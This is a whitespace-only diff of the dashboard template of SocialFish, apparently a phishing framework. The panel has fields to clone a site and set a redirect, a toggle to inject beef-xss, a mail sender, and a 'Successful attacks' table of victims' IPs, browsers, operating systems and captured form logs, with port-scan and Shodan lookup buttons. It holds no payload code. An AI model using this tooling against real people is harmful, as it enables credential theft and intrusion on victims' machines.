@@ -32,13 +32,13 @@
 
 function toggleCustom() {
     if (document.getElementById('status').value != 'custom'){
-        document.getElementById('status').value = 'custom';    
+        document.getElementById('status').value = 'custom';
     }else{
         document.getElementById('status').value = 'clone';
     }
-    
+
     if (document.getElementById('clone').disabled){
-        document.getElementById('clone').disabled = false;        
+        document.getElementById('clone').disabled = false;
     }else{
         document.getElementById('clone').disabled = true;
     }
@@ -46,7 +46,7 @@ function toggleCustom() {
 
 function toggleBeef() {
     if (document.getElementById('beef').value != 'yes'){
-        document.getElementById('beef').value = 'yes';    
+        document.getElementById('beef').value = 'yes';
     }else{
         document.getElementById('beef').value = 'no';
     }
@@ -67,37 +67,37 @@ function showSuccess() {
                 <div class="container">
                     <div class="row">
                         <div class="col-md-12">
-                            <div class="au-breadcrumb-content">                                
-                                <div class="au-breadcrumb-left">                                    
+                            <div class="au-breadcrumb-content">
+                                <div class="au-breadcrumb-left">
                                     <span class="au-breadcrumb-span">Your attacks url:</span>
-                                    <ul class="list-unstyled list-inline au-breadcrumb__list">                                        
+                                    <ul class="list-unstyled list-inline au-breadcrumb__list">
                                         <li class="list-inline-item"><a href="http://0.0.0.0:5000" target="_blank" rel="nofollow"><b> http://0.0.0.0:5000</b></a></li>
                                     </ul>
-                                </div>                                
+                                </div>
                                 <form class="au-form-icon--sm" action="/configure" method="POST" onsubmit="showSuccess()">
                                     <input class="au-input--w300 au-input--style2" name="url" id="clone" type="text" placeholder="Clone" autocomplete="off" required="">
                                     <input class="au-input--w300 au-input--style2" name="red" type="text" placeholder="Redirection" autocomplete="off" required="">
-                                    <input type="hidden" name="beef" id="beef" value="no">                                    
+                                    <input type="hidden" name="beef" id="beef" value="no">
                                     <input type="hidden" name="status" id="status" value="clone">
                                     <button class="au-btn--submit2" type="submit">
                                         <i class="zmdi zmdi-flash"></i>
                                     </button>
-                                </form>                                                       
+                                </form>
                             </div>
                             <div style="text-align: right; margin-top: 30px;">
-                                <small>Custom HTML</small> 
+                                <small>Custom HTML</small>
                                 <label class="switch switch-text switch-info switch-pill">
                                   <input type="checkbox" class="switch-input" onclick="toggleCustom()">
                                   <span data-on="On" data-off="Off" class="switch-label"></span>
                                   <span class="switch-handle"></span>
-                                </label>         
-                                <small> Inject beef-xss</small> 
+                                </label>
+                                <small> Inject beef-xss</small>
                                 <label class="switch switch-text switch-info switch-pill">
                                   <input type="checkbox" class="switch-input" onclick="toggleBeef()">
                                   <span data-on="On" data-off="Off" class="switch-label"></span>
                                   <span class="switch-handle"></span>
-                                </label>         
-                            </div>                            
+                                </label>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -109,8 +109,8 @@ function showSuccess() {
                 <div class="container">
                     <div class="row">
                         <div class="col-md-12">
-                            <h4 class="title-4">Easy Access</h4>  
-                            <img src="/token/qrcode.svg" /><br>                          
+                            <h4 class="title-4">Easy Access</h4>
+                            <img src="/token/qrcode.svg" /><br>
                             <small>Your App Token: <b>{{tokenapi}}</b>
                             <form action="/revokeToken" method="POST">
                                 <div style="color: red">
@@ -119,10 +119,10 @@ function showSuccess() {
                                 </div>
                                 <a href="https://github.com/UndeadSec/SocialFishMobile" target="_blank" rel="nofollow"><i class="fas fa-mobile-alt"></i> Control SocialFish via mobile app</a></small>
                             </form>
-                            <div style="text-align: right;">                        
+                            <div style="text-align: right;">
                                 <button type="button" class="btn btn-primary" style="margin: 2px;" onclick="location.href='/mail'"><i class="fas fa-envelope"></i>&nbsp; Send Mail</button>
                                 <button type="button" class="btn btn-info" style="margin: 2px;" onclick="location.href='/report'"><i class="fas fa-file-alt"></i>&nbsp; Generate Report <small> BETA</small></button>
-                            </div>                            
+                            </div>
                             <hr class="line-seprate">
                         </div>
                     </div>
@@ -180,24 +180,24 @@ function showSuccess() {
                 <div class="container">
                     <div class="row">
                         <div class="col-md-12">
-                            <h3 class="title-5 m-b-35">Successful attacks</h3>                            
+                            <h3 class="title-5 m-b-35">Successful attacks</h3>
                             <div class="table-responsive table-responsive-data2">
                                 <table class="table table-data2">
                                     <thead>
-                                        <tr>                                                                                
+                                        <tr>
                                             <th>url</th>
                                             <th>ip</th>
                                             <th>browser</th>
                                             <th>operating system</th>
                                             <th>date</th>
                                             <th>port scan</th>
-                                            <th>post log</th>                                            
-                                        </tr> 
+                                            <th>post log</th>
+                                        </tr>
                                     </thead>
                                     <tbody>
-                                        {% for item in data %}  
+                                        {% for item in data %}
 
-                                        <tr class="tr-shadow">                                                                                
+                                        <tr class="tr-shadow">
                                             <td><span class="block-email">{{item[1].replace('http://','').replace('https://', '')[:30]}}</span></td>
                                             <td>{{item[6]}}
                                                 <a href="trace/{{item[6]}}" target="_blank" rel="nofollow">
@@ -210,7 +210,7 @@ function showSuccess() {
                                             {% else %}
                                                 {{item[4]}} v{{item[5]}}
                                             {% endif %}
-                                            </td>                                                  
+                                            </td>
                                             <td>
                                                 {% if 'iphone' in item[5] or 'ipad' in item[5] %}
                                                     <i class="fab fa-apple"></i> {{item[5]}}
@@ -218,21 +218,21 @@ function showSuccess() {
                                                     <i class="fab fa-{{item[5]}}"></i> {{item[5]}}
                                                 {% endif %}
                                             </td>
-                                            <td><i class="far fa-calendar-alt"></i> {{item[2]}}</td>                                             
+                                            <td><i class="far fa-calendar-alt"></i> {{item[2]}}</td>
                                             <td>
                                                 <a href="scansf/{{item[6]}}" target="_blank" rel="nofollow">
                                                     <button type="button"><i class="fas fa-bullseye"></i> Scan  </button>
                                                 </a>
                                                 <a href="https://www.shodan.io/host/{{item[6]}}" target="_blank" rel="nofollow">
                                                     <button type="button"><i class="fas fa-spider"></i> Shodan</button>
-                                                </a>                                                
-                                            </td>                          
+                                                </a>
+                                            </td>
                                             <td>
                                                 <a href="single/{{item[0]}}" target="_blank" rel="nofollow">
                                                     <button type="button"><i class="fas fa-search"></i> View</button>
                                                 </a>
                                             </td>
-                                        </tr>                                        
+                                        </tr>
                                         <tr class="spacer"></tr>
                                         {% endfor %}
                                     </tbody>
